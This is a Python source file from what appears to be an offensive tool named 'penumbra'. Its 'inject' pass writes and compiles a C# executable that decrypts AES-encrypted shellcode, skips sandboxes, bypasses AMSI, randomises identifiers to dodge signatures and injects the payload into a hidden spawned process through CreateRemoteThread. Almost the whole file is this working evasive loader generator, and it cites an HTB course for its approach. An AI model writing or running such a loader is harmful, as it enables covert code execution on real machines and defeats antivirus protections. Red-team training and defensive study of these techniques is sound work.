"""Shellcode process injection pass — generates a C# exe that injects into a remote process.

Uses standard PInvoke (matching HTB module's teaching approach):
1. Spawns target process (configurable, default notepad.exe)
2. VirtualAllocEx with PAGE_READWRITE
3. WriteProcessMemory to copy decrypted shellcode
4. VirtualProtectEx to PAGE_EXECUTE_READ
5. CreateRemoteThread to execute

Includes: AES decryption, sandbox evasion, AMSI bypass, payload fragmentation, junk classes.
"""

from __future__ import annotations

import base64
import shutil
import tempfile
from pathlib import Path

from penumbra.dotnet._loader_utils import (
    compile_dotnet_project,
    generate_standard_project_files,
    plausible_class,
    plausible_field,
    plausible_name,
)
from penumbra.types import PassConfig


def _generate_inject_project(
    encrypted_b64: str,
    key_b64: str,
    iv_b64: str,
    target_process: str,
    project_dir: Path,
) -> None:
    """Generate C# project for remote process injection."""
    used = set[str]()

    main_cls = plausible_class()
    used.add(main_cls)
    entry_method = plausible_name()
    key_field = plausible_field()
    iv_field = plausible_field()
    result_var = plausible_field()
    sc_var = plausible_field()
    proc_var = plausible_field()
    handle_var = plausible_field()
    addr_var = plausible_field()
    old_protect_var = plausible_field()
    thread_var = plausible_field()
    sleep_var = plausible_field()

    amsi_cls, amsi_method, reassemble_expr, _ = generate_standard_project_files(
        project_dir, encrypted_b64, key_b64, used
    )

    # .csproj — net472 WinExe
    (project_dir / "Loader.csproj").write_text(
        '<Project Sdk="Microsoft.NET.Sdk">\n'
        "  <PropertyGroup>\n"
        "    <OutputType>WinExe</OutputType>\n"
        "    <TargetFramework>net472</TargetFramework>\n"
        "    <LangVersion>10</LangVersion>\n"
        "  </PropertyGroup>\n"
        "</Project>\n"
    )

    # Escape target process name for C# string
    target_escaped = target_process.replace("\\", "\\\\").replace('"', '\\"')

    program_template = (
        "using System;\n"
        "using System.Diagnostics;\n"
        "using System.Runtime.InteropServices;\n"
        "using System.Security.Cryptography;\n\n"
        "internal static class {mcls}\n"
        "{{\n"
        '    private static readonly string {kf} = "{kb}";\n'
        '    private static readonly string {ivf} = "{ivb}";\n\n'
        '    [DllImport("kernel32.dll")]\n'
        "    private static extern IntPtr OpenProcess(\n"
        "        uint access, bool inherit, int pid);\n"
        '    [DllImport("kernel32.dll")]\n'
        "    private static extern IntPtr VirtualAllocEx(\n"
        "        IntPtr hProc, IntPtr addr, uint size, uint type, uint protect);\n"
        '    [DllImport("kernel32.dll")]\n'
        "    private static extern bool WriteProcessMemory(\n"
        "        IntPtr hProc, IntPtr addr, byte[] buf, uint size, out UIntPtr written);\n"
        '    [DllImport("kernel32.dll")]\n'
        "    private static extern bool VirtualProtectEx(\n"
        "        IntPtr hProc, IntPtr addr, UIntPtr size, uint newProt, out uint oldProt);\n"
        '    [DllImport("kernel32.dll")]\n'
        "    private static extern IntPtr CreateRemoteThread(\n"
        "        IntPtr hProc, IntPtr attr, uint stackSize, IntPtr startAddr,\n"
        "        IntPtr param, uint flags, IntPtr threadId);\n"
        '    [DllImport("kernel32.dll")]\n'
        "    private static extern uint WaitForSingleObject(IntPtr h, uint ms);\n"
        '    [DllImport("kernel32.dll")]\n'
        "    private static extern bool CloseHandle(IntPtr h);\n\n"
        "    private static void {em}()\n"
        "    {{\n"
        # Sandbox checks
        "        var {sv} = DateTime.Now;\n"
        "        System.Threading.Thread.Sleep(1500);\n"
        "        if ((DateTime.Now - {sv}).TotalMilliseconds < 1000) return;\n"
        "        if (Environment.ProcessorCount < 2) return;\n\n"
        # AMSI bypass
        "        {ac}.{am}();\n\n"
        # Decrypt payload
        "        var {rv} = Convert.FromBase64String({rae});\n"
        "        var keyBytes = Convert.FromBase64String({kf});\n"
        "        var ivBytes = Convert.FromBase64String({ivf});\n\n"
        "        byte[] {scv};\n"
        "        using (var aes = Aes.Create())\n"
        "        {{\n"
        "            aes.Key = keyBytes;\n"
        "            aes.IV = ivBytes;\n"
        "            var dec = aes.CreateDecryptor();\n"
        "            {scv} = dec.TransformFinalBlock({rv}, 0, {rv}.Length);\n"
        "        }}\n\n"
        # Spawn target process
        '        var {pv} = Process.Start(new ProcessStartInfo("{target}")\n'
        "        {{\n"
        "            WindowStyle = ProcessWindowStyle.Hidden\n"
        "        }});\n"
        "        if ({pv} == null) return;\n"
        "        System.Threading.Thread.Sleep(500);\n\n"
        # Open process
        "        var {hv} = OpenProcess(0x001FFFFF, false, {pv}.Id);\n"
        "        if ({hv} == IntPtr.Zero) return;\n\n"
        # VirtualAllocEx (PAGE_READWRITE = 0x04)
        "        var {av} = VirtualAllocEx(\n"
        "            {hv}, IntPtr.Zero, (uint){scv}.Length, 0x3000, 0x04);\n"
        "        if ({av} == IntPtr.Zero) {{ CloseHandle({hv}); return; }}\n\n"
        # WriteProcessMemory
        "        UIntPtr written;\n"
        "        WriteProcessMemory(\n"
        "            {hv}, {av}, {scv}, (uint){scv}.Length, out written);\n\n"
        # VirtualProtectEx (PAGE_EXECUTE_READ = 0x20)
        "        uint {opv};\n"
        "        VirtualProtectEx(\n"
        "            {hv}, {av}, (UIntPtr){scv}.Length, 0x20, out {opv});\n\n"
        # CreateRemoteThread
        "        var {tv} = CreateRemoteThread(\n"
        "            {hv}, IntPtr.Zero, 0, {av},\n"
        "            IntPtr.Zero, 0, IntPtr.Zero);\n"
        "        if ({tv} != IntPtr.Zero)\n"
        "            WaitForSingleObject({tv}, 0xFFFFFFFF);\n\n"
        "        CloseHandle({hv});\n"
        "    }}\n\n"
        "    private static void Main() => {em}();\n"
        "}}\n"
    )
    program_cs = program_template.format(
        mcls=main_cls,
        kf=key_field,
        kb=key_b64,
        ivf=iv_field,
        ivb=iv_b64,
        em=entry_method,
        sv=sleep_var,
        ac=amsi_cls,
        am=amsi_method,
        rv=result_var,
        rae=reassemble_expr,
        scv=sc_var,
        pv=proc_var,
        target=target_escaped,
        hv=handle_var,
        av=addr_var,
        opv=old_protect_var,
        tv=thread_var,
    )
    (project_dir / "Program.cs").write_text(program_cs)


class ShellcodeInjectPass:
    """Generate a C# exe that injects shellcode into a remote process.

    Expects input in the format produced by ShellcodeEncryptPass:
    ``key (32 bytes) || IV (16 bytes) || AES-256-CBC ciphertext``.
    """

    opt_in = True

    @property
    def name(self) -> str:
        return "inject"

    def apply(self, data: bytes, config: PassConfig) -> bytes:
        if len(data) < 49:
            raise ValueError(
                "Encrypted shellcode too short. Expected "
                "[32-byte key][16-byte IV][ciphertext]."
            )

        if not shutil.which("dotnet"):
            raise RuntimeError("dotnet SDK not found. Install .NET 8+ SDK.")

        target = str(config.extra.get("inject_process", "notepad.exe"))

        key = data[:32]
        iv = data[32:48]
        ciphertext = data[48:]

        key_b64 = base64.b64encode(key).decode("ascii")
        iv_b64 = base64.b64encode(iv).decode("ascii")
        encrypted_b64 = base64.b64encode(ciphertext).decode("ascii")

        tmp_dir = tempfile.mkdtemp(prefix="penumbra_sc_inject_")
        tmp_path = Path(tmp_dir)

        try:
            _generate_inject_project(
                encrypted_b64, key_b64, iv_b64, target, tmp_path
            )
            return compile_dotnet_project(tmp_path, "net472")
        finally:
            shutil.rmtree(tmp_dir, ignore_errors=True)
